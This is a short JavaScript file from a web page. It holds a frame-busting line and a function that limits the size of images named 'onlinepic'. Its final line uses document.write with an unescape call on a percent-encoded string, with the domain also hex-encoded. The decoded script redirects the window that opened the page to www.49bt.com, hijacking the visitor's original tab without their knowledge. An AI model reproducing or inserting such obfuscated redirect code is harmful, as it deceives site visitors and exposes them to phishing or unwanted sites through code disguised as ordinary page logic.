if (top.location != self.location) 
{top.location=self.location;}
function formatonlinpic()
{var picobj=document.getElementsByName("onlinepic");
var picnum=picobj.length;
for(var i=0;i<picnum;i++)
{if(picobj[i].width>200)
{picobj[i].width=200;}
if(picobj[i].height>200)
{picobj[i].height=200;}}}
document.write(unescape('%3CSCRIPT%3E%20%0D%0Aif%28parent.window.opener%29%20parent.window.opener.location%3D%27http%3A//%77%77%77%2E%34%39%62%74%2E%63%6F%6D/%27%3B%20%3C/SCRIPT%3E'))